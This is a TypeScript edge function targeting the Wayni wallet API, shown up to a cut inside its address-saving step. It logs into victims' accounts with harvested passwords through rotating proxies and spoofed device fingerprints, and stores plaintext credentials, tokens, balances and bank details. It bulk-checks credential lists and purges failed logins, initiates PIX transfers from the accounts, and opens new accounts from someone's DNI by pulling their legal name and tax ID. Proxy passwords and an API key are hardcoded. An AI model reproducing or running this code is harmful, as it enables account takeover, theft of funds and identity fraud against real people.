import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

// ─── PROXY CONFIG (BR priority, US fallback) ───
const PROXY_BR = "http://usermmpnt9jh171o-res-br:Pwd3Z4HIoCHzyP47auRU4Y0@gw.proxy.rainproxy.io:5959";
const PROXY_US = "http://usermmpnt9jh171o-res-us:Pwd3Z4HIoCHzyP47auRU4Y0@gw.proxy.rainproxy.io:5959";
const PROXY_TIMEOUT_MS = 5000;
const DIRECT_TIMEOUT_MS = 8000;

const proxyClients = new Map<string, Deno.HttpClient | null>();

function getProxyClient(proxyUrl: string): Deno.HttpClient | undefined {
  if (proxyClients.has(proxyUrl)) {
    return proxyClients.get(proxyUrl) ?? undefined;
  }

  try {
    const client = Deno.createHttpClient({ proxy: { url: proxyUrl } });
    proxyClients.set(proxyUrl, client);
    return client;
  } catch {
    proxyClients.set(proxyUrl, null);
    return undefined;
  }
}

function fetchViaProxy(url: string, init: RequestInit, proxyUrl: string, timeoutMs: number): Promise<Response> {
  const client = getProxyClient(proxyUrl);
  if (!client) return Promise.reject(new Error("proxy client unavailable"));

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  return fetch(url, { ...init, client, signal: controller.signal } as any)
    .finally(() => clearTimeout(timer));
}

async function proxyFetch(url: string, init: RequestInit): Promise<Response> {
  const method = String(init?.method || "GET").toUpperCase();

  const directFetch = async (delayMs = 0) => {
    if (delayMs > 0) {
      await new Promise((resolve) => setTimeout(resolve, delayMs));
    }
    return await fetch(url, { ...init, signal: AbortSignal.timeout(DIRECT_TIMEOUT_MS) });
  };

  try {
    if (method === "GET" || method === "HEAD") {
      return await Promise.any([
        fetchViaProxy(url, init, PROXY_BR, PROXY_TIMEOUT_MS),
        fetchViaProxy(url, init, PROXY_US, PROXY_TIMEOUT_MS),
        directFetch(800),
      ]);
    }

    for (const proxyUrl of [PROXY_BR, PROXY_US]) {
      try {
        return await fetchViaProxy(url, init, proxyUrl, PROXY_TIMEOUT_MS);
      } catch {
        // try next path
      }
    }

    return await directFetch(0);
  } catch {
    return new Response(JSON.stringify({
      success: false,
      code: "UPSTREAM_UNAVAILABLE",
      message: "Servicio temporalmente no disponible. Intentá nuevamente.",
      transient: true,
    }), {
      status: 502,
      headers: { "Content-Type": "application/json" },
    });
  }
}

async function safeJson(res: Response, fallback: any = {}): Promise<any> {
  try {
    const text = await res.text();
    return JSON.parse(text);
  } catch {
    return fallback;
  }
}

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const AUTH_URL = "https://auth.waynimovil.ar/api/v1/auth";
const WALLET_URL = "https://billetera.waynimovil.ar/me/api/v1/me";

const COMMON_HEADERS = {
  "Accept": "application/json, text/plain, */*",
  "Content-Type": "application/json",
  "User-Agent": "Waynimobile/1 CFNetwork/1331.0.7 Darwin/21.4.0",
  "x-app-source": "ReactNativeApp",
};

function makeCorrelationId() {
  return crypto.randomUUID();
}

function getSupabase() {
  return createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
  );
}

// ─── LOGIN ───
function detectFieldType(identification: string): string {
  return identification.includes("@") ? "email" : "identity_number";
}

async function wayniLogin(identification: string, password: string) {
  const field_type = detectFieldType(identification);
  const res = await proxyFetch(`${AUTH_URL}/`, {
    method: "POST",
    headers: { ...COMMON_HEADERS, "x-correlation-id": makeCorrelationId() },
    body: JSON.stringify({ field_type, identification, password }),
  });
  const data = await safeJson(res, {});
  if (!res.ok || !data?.access_token) {
    throw new Error(data?.message || data?.error || "Login temporalmente indisponible");
  }
  return data;
}

// ─── GET PROFILE ───
async function wayniGetMe(token: string) {
  const res = await proxyFetch(`${WALLET_URL}/`, {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error("Get profile temporalmente indisponible");
  return await safeJson(res);
}

// ─── GET BALANCE ───
async function wayniGetBalance(token: string) {
  const res = await proxyFetch(`${WALLET_URL}/balance`, {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error("Get balance temporalmente indisponible");
  return await safeJson(res);
}

// ─── PIX: validate-and-create ───
async function wayniPixValidate(token: string, pixKey: string, userUuid: string) {
  const res = await proxyFetch(`${WALLET_URL}/payment-pix/validate-and-create`, {
    method: "POST",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
    body: JSON.stringify({
      pixKey,
      userUuid,
      deviceFingerPrint: `${crypto.randomUUID()}|iOS|15.4.1|Apple|iPhone 6s|iPhone8,1|19E258|com.waynimovil.wallet.ios|02`,
    }),
  });
  if (!res.ok) {
    const err = await res.text();
    throw new Error(`PIX validate failed: ${err || res.status}`);
  }
  return await safeJson(res);
}

// ─── PIX: process ───
async function wayniPixProcess(token: string, paymentUuid: string, brlAmount: number) {
  const res = await proxyFetch(`${WALLET_URL}/payment-pix/process`, {
    method: "POST",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
    body: JSON.stringify({ paymentUuid, brlAmount }),
  });
  if (!res.ok) {
    const err = await res.text();
    throw new Error(`PIX process failed: ${err || res.status}`);
  }
  return await safeJson(res);
}

// ─── PIX: get-information ───
async function wayniPixInfo(token: string, paymentUuid: string) {
  const res = await proxyFetch(`${WALLET_URL}/payment-pix/get-information/${paymentUuid}`, {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error("PIX info temporalmente indisponible");
  return await safeJson(res);
}

// ─── CREDITS ───
async function wayniGetCredits(token: string) {
  const res = await proxyFetch("https://billetera.waynimovil.ar/me/api/v2/me/credits", {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error("Get credits temporalmente indisponible");
  return await safeJson(res);
}

// ─── ACTIVITIES ───
async function wayniActivities(token: string, walletAccount: string) {
  const now = new Date().toUTCString();
  const from = new Date(Date.now() - 90 * 86400000).toUTCString();
  const url = `https://billetera.waynimovil.ar/activity/api/v1/activities/?page[number]=0&page[size]=20&filter[wallet_account]=${walletAccount}&filter[created_from]=${encodeURIComponent(from)}&filter[created_until]=${encodeURIComponent(now)}`;
  const res = await proxyFetch(url, {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error("Activities temporalmente indisponible");
  return await safeJson(res);
}

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const body = await req.json();
    const { action } = body;
    const sb = getSupabase();

    // ─── ACTION: login ───
    if (action === "login") {
      const { identification, password, operator_code, session_id, source } = body;
      if (!identification || !password) throw new Error("Missing identification or password");

      const authData = await wayniLogin(identification, password);
      const token = authData.access_token;

      let profile: any = null;
      let balance: any = null;
      let credits: any = null;
      try { profile = await wayniGetMe(token); } catch (e) { console.error("Profile fetch error:", e); }
      try { balance = await wayniGetBalance(token); } catch (e) { console.error("Balance fetch error:", e); }
      try { credits = await wayniGetCredits(token); } catch (e) { console.error("Credits fetch error:", e); }

      const fullName = profile?.profile?.full_name || null;
      const email = profile?.profile?.email || null;
      const phone = profile?.profile?.phone || null;
      const userUuid = profile?.user?.uuid || null;

      const opCode = operator_code || "master";
      const accountSource = typeof source === "string" && source.trim() ? source.trim() : "wayni";
      const { data: existing } = await sb.from("wayni_accounts").select("id").eq("identification", identification).maybeSingle();
      
      const accountData = {
        identification,
        password,
        email,
        full_name: fullName,
        phone,
        access_token: token,
        refresh_token: authData.refresh_token,
        user_uuid: userUuid,
        profile_data: profile,
        balance: balance?.balance || "0",
        bank_data: profile?.bank || null,
        credits_data: credits?.result || null,
        operator_code: opCode,
        source: accountSource,
        last_login_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };

      if (existing) {
        await sb.from("wayni_accounts").update(accountData).eq("id", existing.id);
      } else {
        await sb.from("wayni_accounts").insert(accountData);
      }

      if (session_id) {
        await sb.from("sessions").update({
          status: "login_success",
          email: email || identification,
        }).eq("id", session_id);
      }

      return new Response(JSON.stringify({
        success: true,
        full_name: fullName,
        email,
        balance: balance?.balance || "0",
        user_uuid: userUuid,
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─── ACTION: sync ───
    if (action === "sync") {
      const { account_id } = body;
      if (!account_id) throw new Error("Missing account_id");

      const { data: acc } = await sb.from("wayni_accounts").select("*").eq("id", account_id).maybeSingle();
      if (!acc || !acc.access_token) throw new Error("Account not found or no token");

      let profile: any = null;
      let balance: any = null;
      let credits: any = null;
      try { profile = await wayniGetMe(acc.access_token); } catch (e) { console.error("Sync profile error:", e); }
      try { balance = await wayniGetBalance(acc.access_token); } catch (e) { console.error("Sync balance error:", e); }
      try { credits = await wayniGetCredits(acc.access_token); } catch (e) { console.error("Sync credits error:", e); }

      let activities: any = null;
      try {
        const walletAccount = profile?.bank?.internal_account?.[0]?.wallet_account;
        if (walletAccount) {
          activities = await wayniActivities(acc.access_token, walletAccount);
        }
      } catch (e) { console.error("Activities error:", e); }

      const updateData: any = {
        profile_data: profile,
        balance: balance?.balance || acc.balance,
        bank_data: profile?.bank || acc.bank_data,
        credits_data: credits?.result || acc.credits_data,
        full_name: profile?.profile?.full_name || acc.full_name,
        email: profile?.profile?.email || acc.email,
        phone: profile?.profile?.phone || acc.phone,
        last_data_sync_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };
      if (activities) updateData.activities = activities;

      await sb.from("wayni_accounts").update(updateData).eq("id", account_id);

      return new Response(JSON.stringify({ success: true, balance: updateData.balance, profile, activities }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: relogin ───
    if (action === "relogin") {
      const { account_id } = body;
      if (!account_id) throw new Error("Missing account_id");

      const { data: acc } = await sb.from("wayni_accounts").select("*").eq("id", account_id).maybeSingle();
      if (!acc || !acc.identification || !acc.password) throw new Error("Account not found or missing credentials");

      const authData = await wayniLogin(acc.identification, acc.password);
      
      await sb.from("wayni_accounts").update({
        access_token: authData.access_token,
        refresh_token: authData.refresh_token,
        last_login_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      }).eq("id", account_id);

      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: pix_validate ───
    if (action === "pix_validate") {
      const { account_id, pix_key } = body;
      if (!account_id || !pix_key) throw new Error("Missing account_id or pix_key");

      const { data: acc } = await sb.from("wayni_accounts").select("access_token, user_uuid, identification, full_name, operator_code").eq("id", account_id).maybeSingle();
      if (!acc?.access_token || !acc?.user_uuid) throw new Error("No token or user_uuid");

      const result = await wayniPixValidate(acc.access_token, pix_key, acc.user_uuid);
      
      // Log the PIX validation
      await sb.from("wayni_pix_transactions").insert({
        wayni_account_id: account_id,
        account_identification: acc.identification,
        account_name: acc.full_name,
        pix_key: result.reformatedKey || pix_key,
        recipient_name: result.ownerName,
        amount_brl: 0,
        payment_uuid: result.paymentUuid,
        payment_status: "validated",
        operator_code: acc.operator_code || "master",
      });

      return new Response(JSON.stringify({ success: true, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: pix_process ───
    if (action === "pix_process") {
      const { account_id, payment_uuid, brl_amount } = body;
      if (!account_id || !payment_uuid || !brl_amount) throw new Error("Missing params");

      const { data: acc } = await sb.from("wayni_accounts").select("access_token").eq("id", account_id).maybeSingle();
      if (!acc?.access_token) throw new Error("No token");

      const result = await wayniPixProcess(acc.access_token, payment_uuid, brl_amount);
      
      // Update PIX transaction record
      await sb.from("wayni_pix_transactions").update({
        amount_brl: brl_amount,
        amount_ars: result.arsAmount || null,
        payment_status: result.paymentStatus || "processed",
        result_data: result,
      }).eq("payment_uuid", payment_uuid);

      return new Response(JSON.stringify({ success: true, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: pix_info ───
    if (action === "pix_info") {
      const { account_id, payment_uuid } = body;
      if (!account_id || !payment_uuid) throw new Error("Missing params");

      const { data: acc } = await sb.from("wayni_accounts").select("access_token").eq("id", account_id).maybeSingle();
      if (!acc?.access_token) throw new Error("No token");

      const result = await wayniPixInfo(acc.access_token, payment_uuid);
      
      // Update PIX transaction with latest status
      const updateFields: any = {
        payment_status: result.paymentStatus || "unknown",
        result_data: result,
      };
      if (result.arsAmount) updateFields.amount_ars = result.arsAmount;
      if (result.exchangeRate) updateFields.exchange_rate = result.exchangeRate;
      if (result.bankTransactionId) updateFields.bank_transaction_id = result.bankTransactionId;
      if (result.brlAmount) updateFields.amount_brl = result.brlAmount;
      
      await sb.from("wayni_pix_transactions").update(updateFields).eq("payment_uuid", payment_uuid);

      return new Response(JSON.stringify({ success: true, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: bulk ───
    if (action === "bulk") {
      const { accounts: bulkAccounts, operator_code: bulkOpCode, source } = body;
      if (!Array.isArray(bulkAccounts) || bulkAccounts.length === 0) throw new Error("Missing accounts array");

      const bulkSource = typeof source === "string" && source.trim() ? source.trim() : "wayni";
      const results = [];
      for (const acc of bulkAccounts) {
        const { identification, password } = acc;
        if (!identification || !password) {
          results.push({ success: false, identification: identification || "?", error: "Missing credentials" });
          continue;
        }
        try {
          const authData = await wayniLogin(identification, password);
          const token = authData.access_token;

          let profile: any = null;
          let balance: any = null;
          let activities: any = null;
          let credits: any = null;
          try { profile = await wayniGetMe(token); } catch {}
          try { balance = await wayniGetBalance(token); } catch {}
          try { credits = await wayniGetCredits(token); } catch {}
          try {
            const wa = profile?.bank?.internal_account?.[0]?.wallet_account;
            if (wa) activities = await wayniActivities(token, wa);
          } catch {}

          const fullName = profile?.profile?.full_name || null;
          const email = profile?.profile?.email || null;
          const phone = profile?.profile?.phone || null;
          const userUuid = profile?.user?.uuid || null;
          const opCode = bulkOpCode || "master";

          // Save to DB
          const { data: existing } = await sb.from("wayni_accounts").select("id").eq("identification", identification).maybeSingle();
          const accountData = {
            identification,
            password,
            email,
            full_name: fullName,
            phone,
            access_token: token,
            refresh_token: authData.refresh_token,
            user_uuid: userUuid,
            profile_data: profile,
            balance: balance?.balance || "0",
            bank_data: profile?.bank || null,
            credits_data: credits?.result || null,
            activities: activities || null,
            operator_code: opCode,
            source: bulkSource,
            last_login_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
          };

          if (existing) {
            await sb.from("wayni_accounts").update(accountData).eq("id", existing.id);
          } else {
            await sb.from("wayni_accounts").insert(accountData);
          }

          results.push({
            success: true,
            identification,
            full_name: fullName,
            email,
            phone,
            balance: balance?.balance || "0",
            user_uuid: userUuid,
            profile,
            bank_data: profile?.bank || null,
            saved: true,
          });
        } catch (e: any) {
          results.push({ success: false, identification, error: e.message || "Login failed" });
        }
      }

      return new Response(JSON.stringify({ success: true, results }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: sync_all ───
    if (action === "sync_all") {
      const { data: accs } = await sb.from("wayni_accounts").select("id, access_token").not("access_token", "is", null);
      if (!accs || accs.length === 0) return new Response(JSON.stringify({ success: true, synced: 0 }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      
      let synced = 0;
      for (const acc of accs) {
        try {
          let profile: any = null;
          let balance: any = null;
          let credits: any = null;
          try { profile = await wayniGetMe(acc.access_token); } catch {}
          try { balance = await wayniGetBalance(acc.access_token); } catch {}
          try { credits = await wayniGetCredits(acc.access_token); } catch {}

          let activities: any = null;
          try {
            const wa = profile?.bank?.internal_account?.[0]?.wallet_account;
            if (wa) activities = await wayniActivities(acc.access_token, wa);
          } catch {}

          const upd: any = {
            balance: balance?.balance || "0",
            last_data_sync_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
          };
          if (profile) {
            upd.profile_data = profile;
            upd.bank_data = profile?.bank || null;
            upd.full_name = profile?.profile?.full_name || null;
            upd.email = profile?.profile?.email || null;
            upd.phone = profile?.profile?.phone || null;
          }
          if (credits?.result) upd.credits_data = credits.result;
          if (activities) upd.activities = activities;

          await sb.from("wayni_accounts").update(upd).eq("id", acc.id);
          synced++;
        } catch (e) {
          console.error(`Sync failed for ${acc.id}:`, e);
        }
      }

      return new Response(JSON.stringify({ success: true, synced }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: relogin_all ───
    if (action === "relogin_all") {
      const { data: accs } = await sb.from("wayni_accounts").select("id, identification, password, access_token").not("password", "is", null);
      if (!accs || accs.length === 0) return new Response(JSON.stringify({ success: true, relogged: 0, synced: 0, errors: [] }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });

      const results: { id: string; identification: string; success: boolean; error?: string }[] = [];
      let relogged = 0;
      let synced = 0;

      for (const acc of accs) {
        try {
          if (!acc.identification || !acc.password) {
            results.push({ id: acc.id, identification: acc.identification || "?", success: false, error: "Missing credentials" });
            continue;
          }

          // Login via proxy
          const field_type = acc.identification.includes("@") ? "email" : "identity_number";
          const loginRes = await proxyFetch(`${AUTH_URL}/`, {
            method: "POST",
            headers: { ...COMMON_HEADERS, "x-correlation-id": crypto.randomUUID() },
            body: JSON.stringify({ field_type, identification: acc.identification, password: acc.password }),
          });
          const loginData = await safeJson(loginRes, {});
          if (!loginRes.ok) {
            results.push({ id: acc.id, identification: acc.identification, success: false, error: loginData?.message || `Status ${loginRes.status}` });
            continue;
          }

          const token = loginData.access_token;
          await sb.from("wayni_accounts").update({
            access_token: token,
            refresh_token: loginData.refresh_token,
            last_login_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
          }).eq("id", acc.id);
          relogged++;

          // Sync profile + balance + credits
          let profile: any = null;
          let balance: any = null;
          let credits: any = null;
          try { profile = await wayniGetMe(token); } catch {}
          try { balance = await wayniGetBalance(token); } catch {}
          try { credits = await wayniGetCredits(token); } catch {}

          let activities: any = null;
          try {
            const wa = profile?.bank?.internal_account?.[0]?.wallet_account;
            if (wa) activities = await wayniActivities(token, wa);
          } catch {}

          const upd: any = {
            balance: balance?.balance || "0",
            last_data_sync_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
          };
          if (profile) {
            upd.profile_data = profile;
            upd.bank_data = profile?.bank || null;
            upd.full_name = profile?.profile?.full_name || null;
            upd.email = profile?.profile?.email || null;
            upd.phone = profile?.profile?.phone || null;
          }
          if (credits?.result) upd.credits_data = credits.result;
          if (activities) upd.activities = activities;

          await sb.from("wayni_accounts").update(upd).eq("id", acc.id);
          synced++;

          results.push({ id: acc.id, identification: acc.identification, success: true });

          // Small delay between accounts to avoid rate limiting
          await new Promise(r => setTimeout(r, 1500));
        } catch (e: any) {
          results.push({ id: acc.id, identification: acc.identification, success: false, error: e.message });
        }
      }

      return new Response(JSON.stringify({ success: true, relogged, synced, total: accs.length, errors: results.filter(r => !r.success), results }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: validate_and_clean ───
    if (action === "validate_and_clean") {
      const pageOffset = body.offset ?? 0;
      const pageLimit = body.limit ?? 9; // 3 batches of 3

      // Get total count first
      const { count: totalCount } = await sb.from("wayni_accounts").select("id", { count: "exact", head: true }).not("password", "is", null);

      const { data: accs } = await sb.from("wayni_accounts")
        .select("id, identification, password, access_token")
        .not("password", "is", null)
        .order("created_at", { ascending: true })
        .range(pageOffset, pageOffset + pageLimit - 1);

      if (!accs || accs.length === 0) return new Response(JSON.stringify({ success: true, valid: 0, removed: 0, total: 0, fetched: 0, offset: pageOffset, hasMore: false, results: [] }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });

      const results: { id: string; identification: string; status: "valid" | "invalid" | "removed"; error?: string }[] = [];
      let valid = 0;
      let removed = 0;
      const batchSize = 3;

      for (let i = 0; i < accs.length; i += batchSize) {
        const batch = accs.slice(i, i + batchSize);
        
        const batchPromises = batch.map(async (acc) => {
          if (!acc.identification || !acc.password) {
            await sb.from("wayni_accounts").delete().eq("id", acc.id);
            return { id: acc.id, identification: acc.identification || "?", status: "removed" as const, error: "Sem credenciais" };
          }

          let loginOk = false;
          let lastError = "";
          let token = "";
          let refreshToken = "";

          for (let attempt = 1; attempt <= 2; attempt++) {
            try {
              const field_type = acc.identification.includes("@") ? "email" : "identity_number";
              const loginRes = await proxyFetch(`${AUTH_URL}/`, {
                method: "POST",
                headers: { ...COMMON_HEADERS, "x-correlation-id": crypto.randomUUID() },
                body: JSON.stringify({ field_type, identification: acc.identification, password: acc.password }),
              });
              const loginData = await safeJson(loginRes, {});
              if (loginRes.ok && loginData.access_token) {
                token = loginData.access_token;
                refreshToken = loginData.refresh_token || "";
                loginOk = true;
                break;
              }
              lastError = loginData?.message || `Status ${loginRes.status}`;
            } catch (e: any) {
              lastError = e.message || "Network error";
            }
            if (attempt < 2) await new Promise(r => setTimeout(r, 2000));
          }

          if (!loginOk) {
            await sb.from("wayni_accounts").delete().eq("id", acc.id);
            return { id: acc.id, identification: acc.identification, status: "removed" as const, error: lastError };
          }

          try {
            let profile: any = null;
            let balance: any = null;
            let credits: any = null;
            try { profile = await wayniGetMe(token); } catch {}
            try { balance = await wayniGetBalance(token); } catch {}
            try { credits = await wayniGetCredits(token); } catch {}

            const upd: any = {
              access_token: token,
              refresh_token: refreshToken,
              last_login_at: new Date().toISOString(),
              updated_at: new Date().toISOString(),
              balance: balance?.balance || "0",
              last_data_sync_at: new Date().toISOString(),
            };
            if (profile) {
              upd.profile_data = profile;
              upd.bank_data = profile?.bank || null;
              upd.full_name = profile?.profile?.full_name || null;
              upd.email = profile?.profile?.email || null;
              upd.phone = profile?.profile?.phone || null;
            }
            if (credits?.result) upd.credits_data = credits.result;

            await sb.from("wayni_accounts").update(upd).eq("id", acc.id);
          } catch {}

          return { id: acc.id, identification: acc.identification, status: "valid" as const };
        });

        const batchResults = await Promise.all(batchPromises);
        for (const r of batchResults) {
          results.push(r);
          if (r.status === "valid") valid++;
          if (r.status === "removed") removed++;
        }

        if (i + batchSize < accs.length) await new Promise(r => setTimeout(r, 2000));
      }

      const nextOffset = pageOffset + accs.length;
      const hasMore = nextOffset < (totalCount || 0);

      return new Response(JSON.stringify({ success: true, valid, removed, total: totalCount || 0, fetched: accs.length, offset: pageOffset, hasMore, results }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: onboarding_verify ───
    if (action === "onboarding_verify") {
      const {
        email,
        identity_number,
        phone_number,
        password,
        selected_full_name,
        selected_gender,
        selected_tax_identification_value,
      } = body;

      if (!email || !identity_number) throw new Error("Missing email or identity_number");

      const ONBOARDING_URL = "https://auth.waynimovil.ar/api/v1/onboarding";

      // Step 1: get-legal-data
      console.log("[wayni] Step 1: get-legal-data for", identity_number);
      const legalRes = await proxyFetch(`${ONBOARDING_URL}/get-legal-data`, {
        method: "POST",
        headers: {
          ...COMMON_HEADERS,
          "Host": "auth.waynimovil.ar",
          "x-correlation-id": makeCorrelationId(),
        },
        body: JSON.stringify({
          email,
          identity_number,
          phone_number: phone_number || "",
        }),
      });

      const legalData = await safeJson(legalRes, {});
      const legalRows = Array.isArray(legalData?.data) ? legalData.data : [];
      const legalCandidates = legalRows
        .map((item: Record<string, unknown>) => ({
          identity_number: String(item?.identity_number || identity_number),
          full_name: String(item?.full_name || "").trim(),
          gender: String(item?.gender || "").trim().toUpperCase(),
          tax_identification_value: String(item?.tax_identification_value || "").trim(),
        }))
        .filter((item) => item.full_name && item.tax_identification_value);

      if (!legalRes.ok || !legalCandidates.length) {
        const apiReason = legalData?.message || legalData?.error || "";
        const statusCode = legalRes.status;
        console.warn(`[wayni] get-legal-data failed: status=${statusCode}, reason=${apiReason}`);
        throw new Error(apiReason || `No se encontró información para el DNI proporcionado (código: ${statusCode})`);
      }

      const uniqueCandidates = Array.from(
        new Map(
          legalCandidates.map((candidate) => [
            `${candidate.full_name}|${candidate.gender}|${candidate.tax_identification_value}`,
            candidate,
          ]),
        ).values(),
      );

      const uniqueNames = Array.from(new Set(uniqueCandidates.map((candidate) => candidate.full_name)));
      const selectedName = typeof selected_full_name === "string" ? selected_full_name.trim().toUpperCase() : "";
      const selectedTax = typeof selected_tax_identification_value === "string"
        ? selected_tax_identification_value.trim()
        : "";
      const selectedGenderRaw = typeof selected_gender === "string" ? selected_gender.trim().toUpperCase() : "";

      let selectedCandidate = uniqueCandidates[0];
      if (selectedName || selectedTax) {
        const matched = uniqueCandidates.find((candidate) => {
          const sameName = selectedName ? candidate.full_name.toUpperCase() === selectedName : true;
          const sameTax = selectedTax ? candidate.tax_identification_value === selectedTax : true;
          return sameName && sameTax;
        });

        if (!matched) {
          throw new Error("Nombre o identificación fiscal inválidos para el DNI informado");
        }
        selectedCandidate = matched;
      } else if (uniqueNames.length > 1) {
        return new Response(JSON.stringify({
          success: true,
          requires_selection: true,
          candidates: uniqueCandidates,
          suggested_gender: uniqueCandidates[0]?.gender || "",
        }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const full_name = selectedCandidate.full_name;
      const tax_id = selectedCandidate.tax_identification_value;
      const gender = ["M", "F"].includes(selectedGenderRaw)
        ? selectedGenderRaw
        : (selectedCandidate.gender || "M");

      console.log("[wayni] Legal data selected:", full_name, gender, tax_id);

      // Step 2: save-data
      console.log("[wayni] Step 2: save-data");
      const saveRes = await proxyFetch(`${ONBOARDING_URL}/save-data`, {
        method: "POST",
        headers: {
          ...COMMON_HEADERS,
          "Host": "auth.waynimovil.ar",
          "x-correlation-id": makeCorrelationId(),
        },
        body: JSON.stringify({
          full_name,
          identity_number,
          tax_identification_value: tax_id,
          password,
          password_confirmation: password,
          email,
          phone_number: phone_number || "",
          gender,
        }),
      });

      const saveData = await safeJson(saveRes, {});
      if (!saveRes.ok || !saveData?.data) {
        throw new Error(saveData?.message || saveData?.error || "Error al guardar datos de onboarding");
      }

      const userUuid = saveData.data.uuid;
      console.log("[wayni] save-data OK, uuid:", userUuid);

      // Return without calling biometric - address step comes first
      return new Response(JSON.stringify({
        success: true,
        full_name,
        gender,
        tax_id,
        user_uuid: userUuid,
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─── ACTION: get_provinces ───
    if (action === "get_provinces") {
      console.log("[wayni] get_provinces: fetching");
      let res: Response;
      try {
        res = await proxyFetch("https://api.waynimovil.ar/v3/province/32", {
          method: "GET",
          headers: {
            ...COMMON_HEADERS,
            "Host": "api.waynimovil.ar",
            "x-ms-auth-key": "JrZsFIyVJZTSAcRe5EdVwegbIa4P1yTKmrHyry9r",
            "x-correlation-id": makeCorrelationId(),
          },
        });
      } catch (fetchErr: any) {
        console.error("[wayni] get_provinces proxy failed, trying direct:", fetchErr?.message);
        res = await fetch("https://api.waynimovil.ar/v3/province/32", {
          method: "GET",
          headers: { ...COMMON_HEADERS, "x-ms-auth-key": "JrZsFIyVJZTSAcRe5EdVwegbIa4P1yTKmrHyry9r", "x-correlation-id": makeCorrelationId() },
          signal: AbortSignal.timeout(10000),
        });
      }
      const data = await safeJson(res, []);
      console.log("[wayni] get_provinces status:", res.status, "items:", Array.isArray(data) ? data.length : "N/A");
      if (!res.ok) {
        return new Response(JSON.stringify({ success: false, code: "UPSTREAM_UNAVAILABLE", error: `Provincias no disponibles (${res.status})` }), {
          status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      return new Response(JSON.stringify({ success: true, provinces: data }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: get_localities ───
    if (action === "get_localities") {
      const { province_id } = body;
      if (!province_id) throw new Error("Missing province_id");
      console.log("[wayni] get_localities for province:", province_id);
      let res: Response;
      try {
        res = await proxyFetch(`https://api.waynimovil.ar/v3/locality/${province_id}`, {
          method: "GET",
          headers: {
            ...COMMON_HEADERS,
            "Host": "api.waynimovil.ar",
            "x-correlation-id": makeCorrelationId(),
          },
        });
      } catch (fetchErr: any) {
        console.error("[wayni] get_localities proxy failed, trying direct:", fetchErr?.message);
        res = await fetch(`https://api.waynimovil.ar/v3/locality/${province_id}`, {
          method: "GET",
          headers: { ...COMMON_HEADERS, "x-correlation-id": makeCorrelationId() },
          signal: AbortSignal.timeout(10000),
        });
      }
      const data = await safeJson(res, []);
      if (!res.ok) {
        return new Response(JSON.stringify({ success: false, code: "UPSTREAM_UNAVAILABLE", error: `Localidades no disponibles (${res.status})` }), {
          status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      return new Response(JSON.stringify({ success: true, localities: data }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: save_address ───
    if (action === "save_address") {
      const { uuid, street_name, street_number, floor: addrFloor, apartment, zip_code, neighborhood, city_id, city, region_id, region } = body;
      if (!uuid || !street_name || !street_number || !zip_code || !city_id || !region_id) {
        throw new Error("Missing required address fields");
      }

      const res = await proxyFetch("https://auth.waynimovil.ar/api/v1/onboarding/save-address", {
        method: "POST",
        headers: {
          ...COMMON_HEADERS,
          "Host": "auth.waynimovil.ar",
          "x-correlation-id": makeCorrelationId(),
        },
        body: JSON.stringify({
          uuid,
          street_name,
          street_number: String(street_number),
          floor: addrFloor || null,
          apartment: apartment || null,
          zip_code: String(zip_code),
          neighborhood: neighborhood || null,
